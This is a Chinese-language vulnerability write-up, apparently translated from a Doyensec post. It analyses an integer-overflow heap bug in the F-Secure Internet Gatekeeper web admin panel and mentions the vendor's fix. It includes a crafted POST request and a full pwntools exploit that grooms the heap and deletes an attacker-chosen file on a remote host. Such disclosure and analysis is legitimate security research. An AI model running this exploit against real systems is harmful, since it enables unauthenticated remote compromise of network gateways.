![](https://image.3001.net/images/20200208/1581093865_5e3d93e960c30.jpg!small)

## F-Secure Internet Gatekeeper堆溢出漏洞介绍

 **在这篇文章中，我们将对F-Secure Internet
Gatekeeper应用程序中的一个堆溢出漏洞进行解析，并介绍为何一个简单的错误就导致了一个可利用的未认证远程代码执行漏洞存在。**

## 漏洞复现环境搭建

在我们的实验环境下，所有的漏洞复现与测试都在一台[
_CentOS_](http://isoredirect.centos.org/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-1908.iso)虚拟机中进行，虚拟机配置为至少1个处理器和4GB
RAM。

接下来，下载[ _F-_ _Secure Internet
Gatekeeper_](https://help.f-secure.com/product.html?business/igk/5.40/en/concept_16E400B3FDE344EDB1F699EE9**117DB-5.40-en)：【[
_点我下载_](https://www.f-secure.com/en/business/downloads/internet-gatekeeper)】

但是现在，厂商已经下架了存在漏洞的产品。

### 受影响版本的产品包SHA256如下：

> 1582aa7782f78fcf01fccfe0b59f0a26b4a972020f9da860c19c1076a79c8e26

### 安装步骤：

1、如果你使用的是x64版本的CentOS，请运行下列命令：

yum install glibc.i686；

2、然后，运行下列命令安装F-Secure Internet Gatekeeper；

rpm -I <fsigkbin>.rpm

3、为了方便调试，请安装gdb 8+和gef【[ _点我下载_](https://github.com/hugsy/gef)】。

现在，我们已经可以使用GHIDRA/IDA或者其他反汇编/反编译工具来对F-Secure Internet Gatekeeper进行逆向分析了。

## 漏洞分析

根据F-Secure提供的信息，F-Secure Internet Gatekeeper是一款“高效且易管理的企业网络网关级的安全防护解决方案”。

F-Secure Internet
Gatekeeper包含一个运行在9012/tcp端口上的控制面板，该面板可以用来控制产品中所有可用的服务以及规则，例如HTTP代理和IMAP代理等等。这个控制面板可以通过HTTP协议访问，这个特性由采用C语言开发的fsikgwebui程序实现。实际上，整个Web服务端都采用了C/C++开发，其中也有部分组件使用了CivetWeb的代码，因此我们可以认为服务端很可能使用的是自定义版本的[
_CivetWeb_](https://github.com/civetweb/civetweb)。

由于服务端采用的是C/C++开发的，因此我们就可以尝试去寻找其中是否存在内存崩溃漏洞了，因为这种语言开发的应用程序经常会存在这种安全问题。

在这里，我们选择使用[
_Fuzzotron_](https://github.com/denandz/fuzzotron)来对管理员控制面板进行模糊测试。Fuzzotron是一款功能强大的模糊测试工具，它使用[
_Radamsa_](https://gitlab.com/akihe/radamsa)作为底层引擎驱动，并且内置TCP支持，以便于对网络服务进行模糊测试。对于测试用例，我们选用了一个用于更改管理员控制面板语言设置的有效POST请求，而且未授权用户可以发起该请求，因此非常适合我们的测试场景。

在分析Radamsa经过变异处理的输入样例时，我们可以看到该漏洞与Content-Length
Header有关。导致软件崩溃的测试用例Header值为：Content-Length: 21487483844，这表明溢出漏洞与整数计算错误有关。

在gdb中调试测试用例之后，我们发现导致崩溃的代码位于fs_httpd_civetweb_callback_begin_request函数中，这个函数主要负责处理入栈连接，并且根据HTTP请求类型、地址路径或Cookie来将请求转发给相关的函数进行下一步处理。

在漏洞的复现过程中，我们需要向管理员控制面板所使用的端口9012发送POST请求，我们在其中设置了一个非常大的Content-Length Header值：

    
    
    POST /submit HTTP/1.1
    Host: 192.168.0.24:9012
    Content-Length: 21487483844
    
    AAAAAAAAAAAAAAAAAAAAAAAAAAA

目标应用程序会对该请求进行解析，并执行fs_httpd_get_header函数来获取Content-Length值。接下来，该字段值会被传递给strtoul函数（将字符串转换为无符号长整型）进行处理。

上述控制流对应的伪代码如下：

    
    
    content_len = fs_httpd_get_header(header_struct, "Content-Length");
    if ( content_len ){
       content_len_new = strtoul(content_len_old, 0, 10);
    }

strtoul函数的返回值是一个无符号的长整型，它在32位系统上的最大值为2^32-1。

由于我们提供的Content-Length对无符号长整型来说太长了，因此strtoul函数会返回ULONG_MAX值（原始值发生溢出），那么在32位系统上对应的值就是0xFFFFFFFF。

当fs_httpd_civetweb_callback_begin_request函数尝试执行malloc请求来为数据分配空间时，首先会在Content_Length变量上加1，然后再调用malloc函数。

相应的伪代码如下：

    
    
    // fs_malloc == malloc
    data_by_post_on_heap = fs_malloc(content_len_new + 1)

由于0xFFFFFFFF + 1后将导致整数溢出，最终得到的结果为0x00000000，从而导致malloc分配大小为0个字节的内存空间。

调用malloc(0)时，该函数会返回指向堆的一个有效指针，该指针指向的是最小的一个chunk（大小为0x10字节）。

进一步分析后，我们可以看到代码中还调用了mg_read函数：

    
    
    // content_len_new is without the addition of 0x1.
    // so content_len_new == 0xFFFFFFFF
    if(content_len_new){
        int bytes_read = mg_read(header_struct, data_by_post_on_heap, content_len_new)
    }

发生溢出后，上述代码会读取堆中任意数量的数据，并且没有任何约束，这就非常方便进行漏洞利用了。此时，我们可以停止向HTTP流写入数据，目标软件会直接关闭连接并继续执行操作流。这样一来，我们就可以完全控制需要写入的数据了。

## 漏洞利用PoC

    
    
    from pwn import *
    import time
    import sys
    
    
    
    def send_payload(payload, content_len=21487483844, nofun=False):
        r = remote(sys.argv[1], 9012)
        r.send("POST / HTTP/1.1\n")
        r.send("Host: 192.168.0.122:9012\n")
        r.send("Content-Length: {}\n".format(content_len))
        r.send("\n")
        r.send(payload)
        if not nofun:
            r.send("\n\n")
        return r
    
    
    def trigger_exploit():
        print "Triggering exploit"
        payload = ""
        payload += "A" * 12             # Padding
        payload += p32(0x1d)            # Fast bin chunk overwrite
        payload += "A"* 488             # Padding
        payload += p32(0xdda00771)      # Address of payload
        payload += p32(0xdda00771+4)    # Junk
        r = send_payload(payload)
    
    
    
    def massage_heap(filename):
            print "Trying to massage the heap....."
            for x in xrange(100):
                payload = ""
                payload += p32(0x0)             # Needed to bypass checks
                payload += p32(0x0)             # Needed to bypass checks
                payload += p32(0xdda0077d)      # Points to where the filename will be in memory
                payload += filename + "\x00"
                payload += "C"*(0x300-len(payload))
                r = send_payload(payload, content_len=0x80000, nofun=True)
                r.close()
                cut_conn = True
            print "Heap massage done"
    
    
    if __name__ == "__main__":
        if len(sys.argv) != 3:
            print "Usage: ./{} <victim_ip> <file_to_remove>".format(sys.argv[0])
            print "Run `export PWNLIB_SILENT=1` for disabling verbose connections"
            exit()
        massage_heap(sys.argv[2])
        time.sleep(1)
        trigger_exploit()
        print "Exploit finished. {} is now removed and remote process should be crashed".format(sys.argv[2])

## 漏洞修复

> F-Secure针对该安全问题分配的编号为[
> _FSC-2019-3_](https://www.f-secure.com/en/business/support-and-> downloads/security-advisories/fsc-2019-3)，目前[ _F-> Secure_](https://www.f-secure.com/)已在F-Secure Internet Gatekeeper的v5.40–5.50
> hotfix 8 (2019-07-11)版本中修复了该漏洞。

## 参考资料

### Linux堆溢出漏洞利用：

> 1、[ _Linux Heap Exploitation Intro Series: Set you free() – part
> 1_](https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-> set-you-free-part-1/)
>
> 2、[ _Linux Heap Exploitation Intro Series: Set you free() – part
> 2_](https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-> set-you-free-part-2/)

### GLibC：

> 1、[ _GLibC Malloc for Exploiters –
> YouTube_](https://www.%2A%2A%2A%2A%2A%2A%2A.com/watch?v=z33CYcMf2ug)
>
> 2、[ _Understanding the GLibC Implementation – Part 1_](https://azeria-> labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-> implementation/)
>
> 3、[ _Understanding the GLibC Implementation – Part 2_](https://azeria-> labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)

### 相关工具：

> 1、GEF：[ _https://github.com/hugsy/gef_](https://github.com/hugsy/gef)
>
> 2、Villoc：[
> _https://github.com/wapiflapi/villoc_](https://github.com/wapiflapi/villoc)

 *** 参考来源：[ _doyensec_](https://blog.doyensec.com/2020/02/03/heap-exploit.html)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

